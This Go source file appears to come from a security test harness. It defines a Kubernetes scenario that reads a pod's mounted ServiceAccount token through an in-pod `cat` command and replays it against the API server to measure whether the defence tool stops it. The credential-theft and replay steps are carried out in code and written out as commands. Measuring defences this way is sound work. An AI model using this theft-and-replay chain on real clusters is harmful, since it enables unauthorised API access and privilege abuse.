package scenarios

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/r6security/phoenix-test-harness/internal/config"
	"github.com/r6security/phoenix-test-harness/internal/core"
)

func init() { core.RegisterScenario(&c1CredTheftRBAC{}) }

// c1CredTheftRBAC: read the mounted ServiceAccount token from the compromised pod
// and replay THAT EXACT credential against the API server from OUTSIDE the pod.
//
// ORACLE: the captured credential is replayed twice — once immediately (to prove
// the theft actually landed and the credential is usable) and once again after a
// bounded observation window, re-using the SAME bytes. Continued authenticated
// access after the window is measured attacker capability; a genuine 401/403 after
// an accepted baseline is an observed denial. A failed theft, an unusable initial
// credential, or any transport/protocol fault is an INVALID measurement under the
// shared validity contract — never a defensive success and never a substitute
// credential minted in place of the stolen one.
//
// R6/Phoenix response is a SEPARATE question from measured survival: Phoenix's
// reactive matcher has no emitter signal for a token read+replay, so it cannot
// detect this chain. Whether rotating the source pod invalidates a captured
// credential depends on that credential's binding and is MEASURED here, not
// asserted.
type c1CredTheftRBAC struct {
	app string
	sa  string

	// Per-trial captured state. The credential bytes are SENSITIVE: they live only
	// in this instance's memory for the duration of one trial and are never logged,
	// emitted, hashed or written anywhere. Cleared at Setup, at the start of every
	// Execute, and in Teardown (even when cleanup otherwise fails). Trials run
	// sequentially on this single registered instance, so clearing prevents any
	// previous trial's credential from being reused.
	captured     string           // exfiltrated credential bytes (sensitive)
	captureTime  time.Time        // when the capture succeeded
	sourcePod    string           // provenance: pod the credential came from
	sourceUID    string           // provenance: source pod UID
	credMeta     capturedCredMeta // best-effort, non-authoritative binding/expiry
	baselineDone bool             // the initial post-capture usability replay succeeded
}

func (s *c1CredTheftRBAC) Metadata() core.ScenarioMeta {
	return core.ScenarioMeta{
		Name:               "c1-credtheft-rbac",
		Category:           core.CategoryClassicChain,
		Source:             "Cat1; ADA III.C misconfigured RBAC/leaked secrets; MAESTRO L2/L6",
		R6ResponseTag:      core.R6CannotRespond,
		AttackTechniqueIDs: []string{"T1552.007", "T1528", "T1552.001", "T1078.001", "T1069", "T1550.001"},
		R6Justification:    "Token theft + API replay leaves NO signal in Phoenix's emitter vocabulary; the matcher has nothing to match, so the reactive path cannot respond. Whether rotating the victim pod invalidates the exfiltrated credential is a SEPARATE, binding-dependent question the oracle measures (pod-bound vs unbound vs unknown) rather than assumes.",
	}
}

// clearCaptured wipes all per-trial captured state. It is called at Setup, at the
// start of Execute and in Teardown so no credential outlives its trial and no
// stale credential from a prior trial can be replayed.
func (s *c1CredTheftRBAC) clearCaptured() {
	s.captured = ""
	s.captureTime = time.Time{}
	s.sourcePod = ""
	s.sourceUID = ""
	s.credMeta = capturedCredMeta{}
	s.baselineDone = false
}

func (s *c1CredTheftRBAC) Setup(ctx context.Context, env *core.Env) error {
	s.app = "c1ct-target"
	s.sa = "c1ct-sa"
	s.clearCaptured()
	if err := ensureSAWithRBAC(ctx, env, s.sa); err != nil {
		return err
	}
	_, err := deployTarget(ctx, env, s.app, s.sa, nil)
	return err
}

func (s *c1CredTheftRBAC) Execute(ctx context.Context, env *core.Env) (core.AttackResult, error) {
	// Never carry a prior trial's captured credential into this one.
	s.clearCaptured()

	pod, err := runningPodByApp(ctx, env, s.app)
	if err != nil {
		return core.AttackResult{}, err
	}

	// Cred-access + exfil (T1552.007 / T1528): read the ENTIRE projected token from
	// the pod. The command preserves cat's exit status so a missing/empty file is a
	// real failure, and neither stdout nor stderr is echoed into any error or log.
	res := env.Exec(ctx, pod.Name, firstContainer(pod), []string{"sh", "-c", "cat " + tokenServiceAccountPath})
	token := strings.TrimSpace(res.Stdout)
	switch {
	case res.Err != nil:
		// The exec itself failed to run; nothing was stolen.
		return core.AttackResult{}, fmt.Errorf("credential theft failed: in-pod exec did not run")
	case res.ExitCode != 0:
		return core.AttackResult{}, fmt.Errorf("credential theft failed: in-pod read exited non-zero")
	case token == "":
		return core.AttackResult{}, fmt.Errorf("credential theft failed: no credential material read from the pod")
	}

	// Retain the captured bytes ONLY in this instance's memory for the replay; the
	// token never appears in the AttackResult, notes, logs or evidence.
	s.captured = token
	s.captureTime = time.Now()
	s.sourcePod = pod.Name
	s.sourceUID = string(pod.UID)
	s.credMeta = parseCapturedCredMeta(token)

	// Use (T1550.001 / T1078.001): establish INITIAL usability by replaying the
	// captured bytes against the guarded API. If the theft's credential is not
	// usable right now — empty/denied/unreachable — there is no capability to
	// observe surviving, so this is an attack-stimulus failure (an INVALID
	// measurement under the validity contract), never a defensive success.
	baseline := replayCapturedCredential(ctx, env, s.captured)
	if !baseline.class.authorized() {
		s.clearCaptured()
		return core.AttackResult{}, fmt.Errorf("captured credential was not usable at capture time (%s)", baseline.class)
	}
	s.baselineDone = true

	stages := []string{
		"cred-access: read the projected SA token from the compromised pod (T1552.007)",
		"exfil: copy the credential out of the pod (T1528)",
		"use: replay the captured credential against the API from outside the pod (T1550.001/T1078.001)",
	}
	commands := []string{
		"sh -c 'cat " + tokenServiceAccountPath + "'  # exfiltrate the projected SA token",
		fmt.Sprintf("kubectl --token=<captured> get pods -n %s  # replay the exfiltrated credential", env.Config.Namespace),
	}
	// Notes carry only safe provenance — never the credential.
	notes := map[string]string{
		"sa":            s.sa,
		"sourcePod":     s.sourcePod,
		"sourcePodUID":  s.sourceUID,
		"cred2Binding":  s.credMeta.binding,
		"baselineClass": baseline.class.String(),
	}
	return core.AttackResult{Stages: stages, Commands: commands, Notes: notes}, nil
}

func (s *c1CredTheftRBAC) SuccessOracle(ctx context.Context, env *core.Env) (core.OracleResult, error) {
	// The oracle measures CONTINUED capability of the credential Execute captured.
	// Without a completed capture+baseline from THIS trial there is nothing valid
	// to observe: a missing or stale credential is an invalid measurement, not a
	// success and not a substitute to be minted.
	if s.captured == "" || !s.baselineDone {
		return core.OracleResult{}, fmt.Errorf("no usable captured credential from this trial's Execute (absent or stale state)")
	}

	window := observationWindow(env.Config)

	// Natural-expiry guard (planned): if the captured credential's own decoded
	// expiry already falls within the PLANNED window measured from capture, a
	// post-window denial could be natural expiry rather than defense. Refuse early.
	expKnown := s.credMeta.decoded && s.credMeta.expUnix > 0
	var exp time.Time
	if expKnown {
		exp = time.Unix(s.credMeta.expUnix, 0)
		if !exp.After(s.captureTime.Add(window)) {
			return core.OracleResult{}, fmt.Errorf("captured credential's natural expiry falls within the observation window; measurement is not attributable to the defender")
		}
	}

	// Hold the captured credential for the observation window, re-using the SAME
	// bytes afterwards — never re-reading a fresh projected token from a
	// replacement pod. The wait is context-cancellable; a cancelled wait is an
	// invalid measurement, not a denial.
	waitStart := time.Now()
	if err := credObservationSleep(ctx, window); err != nil {
		return core.OracleResult{}, fmt.Errorf("observation window did not complete: %w", err)
	}

	// Natural-expiry guard (actual, before the final call): if the decoded expiry
	// has already passed by the time the window elapsed, the credential expired on
	// its own and any final outcome is unattributable.
	finalStart := time.Now()
	if expKnown && !exp.After(finalStart) {
		return core.OracleResult{}, fmt.Errorf("captured credential's natural expiry was reached before the final observation; measurement is not attributable to the defender")
	}

	// Final measurement: replay the SAME captured credential after the window.
	// Bracket it with ACTUAL timestamps so scheduling/transport delay is measured
	// against real expiry, not the planned window.
	final := replayCapturedCredential(ctx, env, s.captured)
	finalEnd := time.Now()
	elapsed := finalEnd.Sub(waitStart)

	// Natural-expiry guard (actual, after the final call): if the decoded expiry is
	// reached across the final request itself, transport/scheduling delay cannot be
	// allowed to award the defender credit for natural expiry.
	if expKnown && !exp.After(finalEnd) {
		return core.OracleResult{}, fmt.Errorf("captured credential's natural expiry was reached by the final observation; measurement is not attributable to the defender")
	}

	ev := map[string]string{
		"captureSucceeded":         "true",
		"sourcePod":                s.sourcePod,
		"sourcePodUID":             s.sourceUID,
		"credentialBinding":        s.credMeta.binding,
		"credentialBindingNote":    "decoded binding is descriptive metadata, not independent cryptographic proof",
		"credentialExpiryKnown":    fmt.Sprintf("%v", expKnown),
		"observationWindowSeconds": fmt.Sprintf("%.0f", window.Seconds()),
		"observedElapsedSeconds":   fmt.Sprintf("%.1f", elapsed.Seconds()),
		"captureAtUTC":             s.captureTime.UTC().Format(time.RFC3339),
		"finalObservationAtUTC":    finalEnd.UTC().Format(time.RFC3339),
		"baselineReplay":           "authorized (initial post-capture; defender already running)",
		"finalReplayClass":         final.class.String(),
	}

	switch {
	case final.class.authorized():
		ev["podsListed"] = fmt.Sprintf("%d", final.podCount)
		state := fmt.Sprintf("captured credential still authenticated after %.0fs observation window: HTTP 200, listed %d pods (binding=%s)",
			window.Seconds(), final.podCount, s.credMeta.binding)
		return core.OracleResult{Achieved: true, ObservedState: state, Evidence: ev}, nil
	case final.class.denied():
		// A genuine authenticated refusal after an accepted baseline: observed API
		// use denied. This alone does not prove WHICH actuator caused it.
		state := fmt.Sprintf("captured credential DENIED after %.0fs observation window (%s); post-window API use refused (attribution to a specific actuator not proven)",
			window.Seconds(), final.class)
		return core.OracleResult{Achieved: false, ObservedState: state, Evidence: ev}, nil
	default:
		// Transport/TLS/5xx/malformed/timeout/cancellation/refusal: the observation
		// is not a valid denial, so the measurement is invalid.
		return core.OracleResult{}, fmt.Errorf("final replay observation invalid (%s)", final.class)
	}
}

func (s *c1CredTheftRBAC) Teardown(ctx context.Context, env *core.Env) error {
	// Clear the captured credential regardless of whether the sandbox cleanup
	// succeeds, so no credential survives the trial.
	defer s.clearCaptured()
	return teardownByApp(ctx, env, s.app)
}

// observationWindow resolves the credential-replay observation interval from the
// target config, applying the documented default when it is omitted (0) and
// clamping to the validated maximum so a mis-set config can never make a trial
// wait indefinitely.
func observationWindow(cfg config.TargetConfig) time.Duration {
	sec := cfg.CredentialObservationWindowSeconds
	if sec <= 0 {
		sec = config.DefaultCredentialObservationWindowSeconds
	}
	if sec > config.MaxCredentialObservationWindowSeconds {
		sec = config.MaxCredentialObservationWindowSeconds
	}
	return time.Duration(sec) * time.Second
}
